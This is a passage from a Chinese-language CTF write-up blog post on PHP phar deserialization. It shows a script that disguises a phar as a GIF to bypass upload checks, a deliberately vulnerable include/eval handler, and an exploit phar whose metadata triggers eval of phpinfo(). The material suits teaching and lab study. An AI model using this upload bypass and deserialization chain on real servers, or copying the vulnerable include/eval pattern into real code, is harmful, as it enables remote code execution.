+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>采用这种方法可以绕过很大一部分上传检测</p>
+<h4 id="4、phar实际利用"><a href="#4、phar实际利用" class="headerlink" title="4、phar实际利用"></a>4、phar实际利用</h4><p><strong>4.1，利用条件</strong></p>
+<p>（1）phar文件要能够上传到服务器端。</p>
+<p>（2）要有可用的魔术方法作为“跳板”。</p>
+<p>（3）文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。</p>
+<p><strong>4.2实战</strong></p>
+<p>前端的上传页面</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ea3y_upload_file<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost/ctf/phar/upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>后台的检测页面，先限制好只能传gif</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(<span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>))== <span class="string">&#x27;gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Upload: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Type: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Temp file: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">            <span class="string">&quot;upload_file/&quot;</span> .<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Invalid file,you can only upload gif&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 后台解析文件的php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span> -&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure>
+
+<p> 类里面有个魔幻函数，同时还有一句eval，甚至还能给你一句include，没错，就是它了</p>
+<p>自己打一个生成phar的文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span> -&gt; data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar2.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">AnyClass</span>();</span><br><span class="line"><span class="variable">$object</span> -&gt; data = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，stub前面已经加了gif头，类里面的参数是phpinfo，如果最后能利用的话就会输出php的信息</p>
+<p>执行一下可以看到生成phar2.phar文件，改下后缀成gif文件，然后上传，最后访问</p>
+<img src="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203271322336.png" alt="image-20220327111307054" style="zoom:67%;" />
+
+
+
+
+
+
+
+
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A2%E6%98%8E%E8%B0%B72022"><span class="toc-number">1.</span> <span class="toc-text">红明谷2022</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fan-Website"><span class="toc-number">1.1.</span> <span class="toc-text">Fan Website</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-phar-%E6%8B%93%E5%B1%95-PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-number">1.2.</span> <span class="toc-text">利用 phar:&#x2F;&#x2F; 拓展 PHP 反序列化的攻击面</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E5%9B%9E%E9%A1%BE%E4%B8%80%E4%B8%8B%E5%8E%9F%E5%85%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E7%9A%84%E5%BF%85%E8%A6%81%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.1.</span> <span class="toc-text">1、回顾一下原先PHP反序列化攻击的必要条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81Phar-%E5%A6%82%E4%BD%95%E6%89%A9%E5%B1%95%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%9D%A2%E7%9A%84"><span class="toc-number">1.2.2.</span> <span class="toc-text">2、Phar:&#x2F;&#x2F;如何扩展反序列化攻击面的</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81phar%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">1.2.3.</span> <span class="toc-text">3、phar的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-Phar%E7%9A%84%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">1.Phar的文件结构</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAphar%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">2.如何创建一个phar压缩文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E5%AE%9E%E9%AA%8C"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">3.phar反序列化小实验</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E5%B0%86phar%E4%BC%AA%E9%80%A0%E6%88%90%E5%85%B6%E4%BB%96%E6%A0%BC%E5%BC%8F%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">4.将phar伪造成其他格式的文件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81phar%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.4.</span> <span class="toc-text">4、phar实际利用</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://yenannn.github.io/2022/03/27/%E7%BA%A2%E6%98%8E%E8%B0%B72022/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://yenannn.github.io/2022/03/27/%E7%BA%A2%E6%98%8E%E8%B0%B72022/&text=红明谷2022"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://yenannn.github.io/2022/03/27/%E7%BA%A2%E6%98%8E%E8%B0%B72022/&title=红明谷2022"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://yenannn.github.io/2022/03/27/%E7%BA%A2%E6%98%8E%E8%B0%B72022/&is_video=false&description=红明谷2022"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=红明谷2022&body=Check out this article: https://yenannn.github.io/2022/03/27/%E7%BA%A2%E6%98%8E%E8%B0%B72022/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://yenannn.github.io/2022/03/27/%E7%BA%A2%E6%98%8E%E8%B0%B72022/&title=红明谷2022"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://yenannn.github.io/2022/03/27/%E7%BA%A2%E6%98%8E%E8%B0%B72022/&title=红明谷2022"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://yenannn.github.io/2022/03/27/%E7%BA%A2%E6%98%8E%E8%B0%B72022/&title=红明谷2022"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://yenannn.github.io/2022/03/27/%E7%BA%A2%E6%98%8E%E8%B0%B72022/&title=红明谷2022"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://yenannn.github.io/2022/03/27/%E7%BA%A2%E6%98%8E%E8%B0%B72022/&name=红明谷2022&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://yenannn.github.io/2022/03/27/%E7%BA%A2%E6%98%8E%E8%B0%B72022/&t=红明谷2022"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    Yenan
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
